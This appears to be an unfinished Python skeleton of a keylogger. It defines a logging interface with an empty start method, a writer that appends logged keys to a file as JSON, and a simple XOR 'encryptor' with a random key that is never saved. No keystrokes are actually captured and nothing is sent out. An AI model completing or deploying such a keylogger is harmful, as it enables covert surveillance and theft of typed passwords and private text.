from abc import ABC, abstractmethod
from typing import List
import time
import json
import random
import string



class IKeyLogger(ABC):
    @abstractmethod
    def start_logging(self) -> None:
        pass
    @abstractmethod
    def stop_logging(self) -> None:
        pass
    @abstractmethod
    def get_logged_keys(self) -> dict[str:str]:
        pass

class Write(ABC):
    @abstractmethod
    def write(self, data:str) -> bool:
        pass


class KeyLoggerService(IKeyLogger):
    def __init__(self):
        self.logged_keys = {}
        self.last_key = ""
        self.last_type_time = None

    def start_logging(self) -> None:
        pass



    def stop_logging(self) -> None:
        self.last_key = ""
        self.last_type_time = None

    def get_logged_keys(self) -> dict[str:str]:
        return self.logged_keys



class FileWriter(Write):
    def __init__(self,path=None):
        self.path = path or r""

    def write(self, data:dict[str:str]) -> bool:
        try:
            with open(self.path,"a") as file:
                converrt_data = json.dumps(data)
                file.write(converrt_data)
                return True
        except IOError:
            return False


class Encryptor:
    def __init__(self):
        self.key = "".join(random.choices(string.ascii_letters + string.digits,k=512))

    def encrypt(self,data:str) -> str:
        ciphertext = ""
        for i in range(len(data)):
            index = i % len(self.key)
            ciphertext += chr(ord(data[i]) ^ ord(self.key[index]))
        return ciphertext






